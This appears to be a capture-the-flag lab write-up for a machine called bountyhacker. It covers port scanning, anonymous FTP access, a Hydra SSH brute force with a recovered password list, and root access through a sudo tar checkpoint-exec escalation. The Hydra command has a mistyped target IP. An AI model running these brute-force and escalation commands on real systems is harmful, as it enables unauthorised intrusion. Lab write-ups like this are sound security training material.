## Target IP: `10.10.141.131`

---

### Nmap Scan

```bash
sudo nmap -sC -sV -T4 -O 10.10.141.131 -oN results.txt
```

**Open Ports:**

| Port | Service |
| --- | --- |
| 21 | FTP |
| 22 | SSH |
| 80 | HTTP |

---

### Web Enumeration

- Accessing `http://10.10.141.131` showed only a challenge image.
- Directory brute-forcing yielded nothing:

```bash
gobuster dir -u http://10.10.141.131 -w /usr/share/dirb/wordlists/common.txt
```

---

### FTP Access

- Connected anonymously:

```bash
ftp 10.10.141.131
```

- Username: `anonymous`
- Initial `ls` command resulted in passive mode prompt.
- Disabled passive mode:

```bash
passive
```

- Listed files and found `task.txt` and `locks.txt`.

---

### Found Files

- `task.txt`: Contained miscellaneous content and a username.
- `locks.txt`: List of potential passwords.

---

### SSH Brute Force

```bash
hydra -l lin -P locks.txt ssh://10.10.141.13
```

**Hydra Flags:**

| Flag | Description |
| --- | --- |
| -l | Login/username |
| -P | Password list file |
| ssh:// | Target protocol on port 22 |
- Valid credentials found:
    
    **Username:** `lin`
    
    **Password:** `[REDACTED]`
    
- Logged in via SSH.

---

### Post-Login Enumeration

- Found `user.txt` → Contains user flag.
- Checked sudo privileges:

```bash
sudo -l
```

- Output:

```
User lin may run the following commands on bountyhacker:
(root) /bin/tar
```

---

### Privilege Escalation

- Found `tar` escalation method on GTFOBins (A site for linux privilege escalation):

```bash
sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

- Verified root access:

```bash
whoami
```

- Searched for root flag:

```bash
find / -name "root.txt" 2>/dev/null
```

- Found at: `/root/root.txt`
- Used `cat` to read the final flag.
